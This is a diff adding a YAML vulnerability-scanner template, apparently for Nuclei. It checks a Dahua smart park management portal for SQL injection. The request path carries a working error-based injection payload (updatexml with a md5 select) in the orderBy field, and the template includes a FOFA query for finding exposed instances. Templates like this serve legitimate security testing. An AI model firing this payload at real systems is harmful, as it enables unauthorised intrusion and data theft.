@@ -1,0 +1,25 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - c8c605999f3d8352d7bb792cf3fdb25
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1)--%22%7D/extend/%7B%7D'
+id: dahua-searchJson-sqli
+info:
+  author: Co5mos
+  metadata:
+    fofa-query: "app=\"dahua-\u667A\u6167\u56ED\u533A\u7EFC\u5408\u7BA1\u7406\u5E73\
+      \u53F0\""
+    max-request: 1
+  name: Dahua - SQL Injection
+  severity: critical
+  tags: dahua,sqli
+variables:
+  num: '999999999'
